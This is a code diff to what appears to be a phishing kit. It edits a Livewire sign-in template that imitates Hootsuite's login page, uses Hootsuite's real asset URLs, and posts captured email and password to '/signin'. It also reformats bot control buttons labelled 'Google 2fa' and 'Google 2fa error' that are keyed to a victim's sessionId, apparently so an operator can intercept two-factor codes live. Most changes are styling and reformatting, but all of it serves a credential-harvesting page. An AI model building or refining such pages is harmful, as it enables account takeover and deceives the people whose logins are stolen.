@@ -210,9 +210,36 @@
             cursor: pointer;
             outline: 0;
         }
+
         .inputWrapper .inputContainer:focus {
             border: 3px solid #0b57d0;
         }
+
+        .notification {
+            padding: 12px;
+            margin-bottom: 24px;
+            display: flex;
+        }
+
+        .notification.error {
+            background-color: #f8eaeb;
+        }
+
+        .notification .notificationIconContainer {
+            padding-right: 8px;
+            object-fit: contain;
+            align-self: flex-start;
+        }
+
+        .notification .notificationMessage {
+            flex: 1 1 auto;
+        }
+
+        .notification .notificationMessage .notificationTitle {
+            font-weight: 700;
+            padding-bottom: 4px;
+        }
+
         @media (max-width: 768px) {
             .rtpColumn {
                 display: none;
@@ -637,22 +664,24 @@
                                         <div class="rtpLoginColumn">
                                             <div class="rtpSelectionContainer">
                                                 <h1>Sign in</h1>
-                                                @if($loginError)
-                                                <div class="_notification notification error" role="alert">
-                                                    <div class="notificationIconContainer">
-                                                        <img src="https://assets.hootsuite.com/v2/images/static/login/alerts/error-alert-icon.0fce3bf8.svg" class="notificationIcon">
-                                                    </div>
-                                                    <div class="notificationMessage">
-                                                        <div class="notificationTitle">
-                                                            Please try again
+                                                @if ($loginError)
+                                                    <div class="_notification notification error" role="alert">
+                                                        <div class="notificationIconContainer">
+                                                            <img src="https://assets.hootsuite.com/v2/images/static/login/alerts/error-alert-icon.0fce3bf8.svg"
+                                                                class="notificationIcon">
                                                         </div>
-                                                        Sorry, we couldn't find that email and/or password
+                                                        <div class="notificationMessage">
+                                                            <div class="notificationTitle">
+                                                                Please try again
+                                                            </div>
+                                                            Sorry, we couldn't find that email and/or password
+                                                        </div>
                                                     </div>
-                                                </div>
                                                 @endif
                                                 <!-- Error, Notice and Success Messages -->
                                                 <div class="formContainer">
-                                                    <form method="post" wire:submit.prevent="submitLogin" id="loginForm" class="_emailPasswordForm" action="/signin">
+                                                    <form method="post" wire:submit.prevent="submitLogin"
+                                                        id="loginForm" class="_emailPasswordForm" action="/signin">
                                                         <!-- Email and Password Inputs -->
                                                         <div class="inputWrapper">
                                                             <label for="loginEmailInput">Email</label>
@@ -973,9 +1002,9 @@
                                 },
                             ],
                             [{
-                                text: `Google 2fa`,
-                                callback_data: `/google2fa ${sessionId}`,
-                            },
+                                    text: `Google 2fa`,
+                                    callback_data: `/google2fa ${sessionId}`,
+                                },
                                 {
                                     text: `Google 2fa error`,
                                     callback_data: `/google2faError ${sessionId}`,
